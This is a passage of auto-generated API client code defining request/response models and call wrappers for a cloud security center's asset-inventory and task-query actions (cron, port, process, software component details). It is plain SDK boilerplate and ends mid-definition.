async function describeOfflineMachines(request: DescribeOfflineMachinesRequest): DescribeOfflineMachinesResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOfflineMachinesWithOptions(request, runtime);
}

model DescribeOnceTaskRequest {
  currentPage?: int32(name='CurrentPage'),
  endTimeQuery?: long(name='EndTimeQuery'),
  pageSize?: int32(name='PageSize'),
  rootTaskId?: string(name='RootTaskId'),
  startTimeQuery?: long(name='StartTimeQuery'),
  taskId?: string(name='TaskId'),
  taskType?: string(name='TaskType'),
}

model DescribeOnceTaskResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
  taskManageResponseList?: [ 
    {
      detailData?: string(name='DetailData'),
      failCount?: int32(name='FailCount'),
      progress?: string(name='Progress'),
      resultInfo?: string(name='ResultInfo'),
      successCount?: int32(name='SuccessCount'),
      taskEndTime?: long(name='TaskEndTime'),
      taskId?: string(name='TaskId'),
      taskName?: string(name='TaskName'),
      taskStartTime?: long(name='TaskStartTime'),
      taskStatus?: int32(name='TaskStatus'),
      taskStatusText?: string(name='TaskStatusText'),
      taskType?: string(name='TaskType'),
    }
  ](name='TaskManageResponseList'),
}

model DescribeOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOnceTaskResponseBody(name='body'),
}

async function describeOnceTaskWithOptions(request: DescribeOnceTaskRequest, runtime: Util.RuntimeOptions): DescribeOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTimeQuery)) {
    query['EndTimeQuery'] = request.endTimeQuery;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.rootTaskId)) {
    query['RootTaskId'] = request.rootTaskId;
  }
  if (!Util.isUnset(request.startTimeQuery)) {
    query['StartTimeQuery'] = request.startTimeQuery;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeOnceTask(request: DescribeOnceTaskRequest): DescribeOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOnceTaskWithOptions(request, runtime);
}

model DescribeOnceTaskLeafRecordPageRequest {
  currentPage?: int32(name='CurrentPage'),
  endTime?: long(name='EndTime'),
  pageSize?: int32(name='PageSize'),
  relateInfo?: boolean(name='RelateInfo'),
  source?: string(name='Source'),
  startTime?: long(name='StartTime'),
  statusList?: [ string ](name='StatusList'),
  taskId?: string(name='TaskId'),
  taskType?: string(name='TaskType'),
}

model DescribeOnceTaskLeafRecordPageResponseBody = {
  onceTasks?: [ 
    {
      endTime?: long(name='EndTime'),
      finish?: int32(name='Finish'),
      finishCount?: string(name='FinishCount'),
      progress?: long(name='Progress'),
      realRunTime?: long(name='RealRunTime'),
      resultInfo?: string(name='ResultInfo'),
      startTime?: long(name='StartTime'),
      status?: string(name='Status'),
      statusText?: string(name='StatusText'),
      target?: string(name='Target'),
      targetType?: string(name='TargetType'),
      taskId?: string(name='TaskId'),
      taskImageInfo?: {
        digest?: string(name='Digest'),
        image?: string(name='Image'),
        pod?: string(name='Pod'),
        regionId?: string(name='RegionId'),
        repoId?: string(name='RepoId'),
        repoName?: string(name='RepoName'),
        repoNamespace?: string(name='RepoNamespace'),
        repoRegionId?: string(name='RepoRegionId'),
        tag?: string(name='Tag'),
      }(name='TaskImageInfo'),
      taskName?: string(name='TaskName'),
      taskType?: string(name='TaskType'),
      totalCount?: string(name='TotalCount'),
    }
  ](name='OnceTasks'),
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model DescribeOnceTaskLeafRecordPageResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribeOnceTaskLeafRecordPageResponseBody(name='body'),
}

async function describeOnceTaskLeafRecordPageWithOptions(request: DescribeOnceTaskLeafRecordPageRequest, runtime: Util.RuntimeOptions): DescribeOnceTaskLeafRecordPageResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.relateInfo)) {
    query['RelateInfo'] = request.relateInfo;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.taskId)) {
    query['TaskId'] = request.taskId;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribeOnceTaskLeafRecordPage',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describeOnceTaskLeafRecordPage(request: DescribeOnceTaskLeafRecordPageRequest): DescribeOnceTaskLeafRecordPageResponse {
  var runtime = new Util.RuntimeOptions{};
  return describeOnceTaskLeafRecordPageWithOptions(request, runtime);
}

model DescribePropertyCountRequest {
  type?: string(name='Type'),
  uuidList?: string(name='UuidList'),
}

model DescribePropertyCountResponseBody = {
  autorun?: int32(name='Autorun'),
  cron?: int32(name='Cron'),
  database?: int32(name='Database'),
  lkm?: int32(name='Lkm'),
  port?: int32(name='Port'),
  process?: int32(name='Process'),
  requestId?: string(name='RequestId'),
  sca?: int32(name='Sca'),
  software?: int32(name='Software'),
  user?: int32(name='User'),
  web?: int32(name='Web'),
  webserver?: int32(name='Webserver'),
}

model DescribePropertyCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCountResponseBody(name='body'),
}

async function describePropertyCountWithOptions(request: DescribePropertyCountRequest, runtime: Util.RuntimeOptions): DescribePropertyCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuidList)) {
    query['UuidList'] = request.uuidList;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyCount(request: DescribePropertyCountRequest): DescribePropertyCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCountWithOptions(request, runtime);
}

model DescribePropertyCronDetailRequest {
  currentPage?: int32(name='CurrentPage'),
  extend?: string(name='Extend'),
  pageSize?: int32(name='PageSize'),
  remark?: string(name='Remark'),
  source?: string(name='Source'),
  user?: string(name='User'),
  uuid?: string(name='Uuid'),
}

model DescribePropertyCronDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      cmd?: string(name='Cmd'),
      createTimestamp?: long(name='CreateTimestamp'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      md5?: string(name='Md5'),
      period?: string(name='Period'),
      source?: string(name='Source'),
      user?: string(name='User'),
      uuid?: string(name='Uuid'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyCronDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCronDetailResponseBody(name='body'),
}

async function describePropertyCronDetailWithOptions(request: DescribePropertyCronDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyCronDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCronDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyCronDetail(request: DescribePropertyCronDetailRequest): DescribePropertyCronDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCronDetailWithOptions(request, runtime);
}

model DescribePropertyCronItemRequest {
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  pageSize?: int32(name='PageSize'),
  source?: string(name='Source'),
}

model DescribePropertyCronItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count'),
      source?: string(name='Source'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyCronItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyCronItemResponseBody(name='body'),
}

async function describePropertyCronItemWithOptions(request: DescribePropertyCronItemRequest, runtime: Util.RuntimeOptions): DescribePropertyCronItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyCronItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyCronItem(request: DescribePropertyCronItemRequest): DescribePropertyCronItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyCronItemWithOptions(request, runtime);
}

model DescribePropertyPortDetailRequest {
  bindIp?: string(name='BindIp'),
  currentPage?: int32(name='CurrentPage'),
  extend?: string(name='Extend'),
  pageSize?: int32(name='PageSize'),
  port?: string(name='Port'),
  procName?: string(name='ProcName'),
  remark?: string(name='Remark'),
  uuid?: string(name='Uuid'),
}

model DescribePropertyPortDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      bindIp?: string(name='BindIp'),
      createTimestamp?: long(name='CreateTimestamp'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      pid?: string(name='Pid'),
      port?: string(name='Port'),
      procName?: string(name='ProcName'),
      proto?: string(name='Proto'),
      uuid?: string(name='Uuid'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyPortDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyPortDetailResponseBody(name='body'),
}

async function describePropertyPortDetailWithOptions(request: DescribePropertyPortDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyPortDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.bindIp)) {
    query['BindIp'] = request.bindIp;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.procName)) {
    query['ProcName'] = request.procName;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyPortDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyPortDetail(request: DescribePropertyPortDetailRequest): DescribePropertyPortDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyPortDetailWithOptions(request, runtime);
}

model DescribePropertyPortItemRequest {
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  pageSize?: int32(name='PageSize'),
  port?: string(name='Port'),
}

model DescribePropertyPortItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count'),
      port?: string(name='Port'),
      proto?: string(name='Proto'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyPortItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyPortItemResponseBody(name='body'),
}

async function describePropertyPortItemWithOptions(request: DescribePropertyPortItemRequest, runtime: Util.RuntimeOptions): DescribePropertyPortItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyPortItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyPortItem(request: DescribePropertyPortItemRequest): DescribePropertyPortItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyPortItemWithOptions(request, runtime);
}

model DescribePropertyProcDetailRequest {
  cmdline?: string(name='Cmdline'),
  currentPage?: int32(name='CurrentPage'),
  extend?: string(name='Extend'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize'),
  procTimeEnd?: long(name='ProcTimeEnd'),
  procTimeStart?: long(name='ProcTimeStart'),
  remark?: string(name='Remark'),
  user?: string(name='User'),
  uuid?: string(name='Uuid'),
}

model DescribePropertyProcDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      cmdline?: string(name='Cmdline'),
      createTimestamp?: long(name='CreateTimestamp'),
      euidName?: string(name='EuidName'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      isPackage?: int32(name='IsPackage'),
      md5?: string(name='Md5'),
      name?: string(name='Name'),
      path?: string(name='Path'),
      pid?: string(name='Pid'),
      pname?: string(name='Pname'),
      startTime?: string(name='StartTime'),
      startTimeDt?: long(name='StartTimeDt'),
      state?: string(name='State'),
      user?: string(name='User'),
      uuid?: string(name='Uuid'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyProcDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyProcDetailResponseBody(name='body'),
}

async function describePropertyProcDetailWithOptions(request: DescribePropertyProcDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyProcDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.cmdline)) {
    query['Cmdline'] = request.cmdline;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.extend)) {
    query['Extend'] = request.extend;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.procTimeEnd)) {
    query['ProcTimeEnd'] = request.procTimeEnd;
  }
  if (!Util.isUnset(request.procTimeStart)) {
    query['ProcTimeStart'] = request.procTimeStart;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyProcDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyProcDetail(request: DescribePropertyProcDetailRequest): DescribePropertyProcDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyProcDetailWithOptions(request, runtime);
}

model DescribePropertyProcItemRequest {
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize'),
}

model DescribePropertyProcItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count'),
      name?: string(name='Name'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyProcItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyProcItemResponseBody(name='body'),
}

async function describePropertyProcItemWithOptions(request: DescribePropertyProcItemRequest, runtime: Util.RuntimeOptions): DescribePropertyProcItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyProcItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyProcItem(request: DescribePropertyProcItemRequest): DescribePropertyProcItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyProcItemWithOptions(request, runtime);
}

model DescribePropertyScaDetailRequest {
  biz?: string(name='Biz'),
  bizType?: string(name='BizType'),
  currentPage?: int32(name='CurrentPage'),
  lang?: string(name='Lang'),
  name?: long(name='Name'),
  pageSize?: int32(name='PageSize'),
  pid?: string(name='Pid'),
  port?: string(name='Port'),
  processStartedEnd?: long(name='ProcessStartedEnd'),
  processStartedStart?: long(name='ProcessStartedStart'),
  remark?: string(name='Remark'),
  scaName?: string(name='ScaName'),
  scaNamePattern?: string(name='ScaNamePattern'),
  scaVersion?: string(name='ScaVersion'),
  searchInfo?: string(name='SearchInfo'),
  searchInfoSub?: string(name='SearchInfoSub'),
  searchItem?: string(name='SearchItem'),
  searchItemSub?: string(name='SearchItemSub'),
  user?: string(name='User'),
  uuid?: string(name='Uuid'),
}

model DescribePropertyScaDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      bizType?: string(name='BizType'),
      bizTypeDispaly?: string(name='BizTypeDispaly'),
      cmdline?: string(name='Cmdline'),
      configPath?: string(name='ConfigPath'),
      containerName?: string(name='ContainerName'),
      createTimestamp?: long(name='CreateTimestamp'),
      imageName?: string(name='ImageName'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      listenIp?: string(name='ListenIp'),
      listenProtocol?: string(name='ListenProtocol'),
      listenStatus?: string(name='ListenStatus'),
      name?: string(name='Name'),
      path?: string(name='Path'),
      pid?: string(name='Pid'),
      port?: string(name='Port'),
      ppid?: string(name='Ppid'),
      processStarted?: long(name='ProcessStarted'),
      processUser?: string(name='ProcessUser'),
      proof?: string(name='Proof'),
      runtimeEnvVersion?: string(name='RuntimeEnvVersion'),
      type?: string(name='Type'),
      uuid?: string(name='Uuid'),
      version?: string(name='Version'),
      webPath?: string(name='WebPath'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyScaDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScaDetailResponseBody(name='body'),
}

async function describePropertyScaDetailWithOptions(request: DescribePropertyScaDetailRequest, runtime: Util.RuntimeOptions): DescribePropertyScaDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.bizType)) {
    query['BizType'] = request.bizType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.pid)) {
    query['Pid'] = request.pid;
  }
  if (!Util.isUnset(request.port)) {
    query['Port'] = request.port;
  }
  if (!Util.isUnset(request.processStartedEnd)) {
    query['ProcessStartedEnd'] = request.processStartedEnd;
  }
  if (!Util.isUnset(request.processStartedStart)) {
    query['ProcessStartedStart'] = request.processStartedStart;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.scaName)) {
    query['ScaName'] = request.scaName;
  }
  if (!Util.isUnset(request.scaNamePattern)) {
    query['ScaNamePattern'] = request.scaNamePattern;
  }
  if (!Util.isUnset(request.scaVersion)) {
    query['ScaVersion'] = request.scaVersion;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchInfoSub)) {
    query['SearchInfoSub'] = request.searchInfoSub;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  if (!Util.isUnset(request.searchItemSub)) {
    query['SearchItemSub'] = request.searchItemSub;
  }
  if (!Util.isUnset(request.user)) {
    query['User'] = request.user;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScaDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyScaDetail(request: DescribePropertyScaDetailRequest): DescribePropertyScaDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScaDetailWithOptions(request, runtime);
}

model DescribePropertyScaItemRequest {
  biz?: string(name='Biz'),
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  searchInfo?: string(name='SearchInfo'),
  searchItem?: string(name='SearchItem'),
}

model DescribePropertyScaItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      bizType?: string(name='BizType'),
      count?: int32(name='Count'),
      name?: string(name='Name'),
      typeDisplay?: string(name='TypeDisplay'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyScaItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScaItemResponseBody(name='body'),
}

async function describePropertyScaItemWithOptions(request: DescribePropertyScaItemRequest, runtime: Util.RuntimeOptions): DescribePropertyScaItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScaItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyScaItem(request: DescribePropertyScaItemRequest): DescribePropertyScaItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScaItemWithOptions(request, runtime);
}

model DescribePropertyScheduleConfigRequest {
  type?: string(name='Type'),
}

model DescribePropertyScheduleConfigResponseBody = {
  config?: string(name='Config'),
  requestId?: string(name='RequestId'),
}

model DescribePropertyScheduleConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: DescribePropertyScheduleConfigResponseBody(name='body'),
}

async function describePropertyScheduleConfigWithOptions(request: DescribePropertyScheduleConfigRequest, runtime: Util.RuntimeOptions): DescribePropertyScheduleConfigResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'DescribePropertyScheduleConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function describePropertyScheduleConfig(request: DescribePropertyScheduleConfigRequest): DescribePropertyScheduleConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return describePropertyScheduleConfigWithOptions(request, runtime);
}

model DescribePropertySoftwareDetailRequest {
  currentPage?: int32(name='CurrentPage'),
  extend?: string(name='Extend'),
  installTimeEnd?: long(name='InstallTimeEnd'),
  installTimeStart?: long(name='InstallTimeStart'),
  name?: string(name='Name'),
  pageSize?: int32(name='PageSize'),
  path?: string(name='Path'),
  remark?: string(name='Remark'),
  softwareVersion?: string(name='SoftwareVersion'),
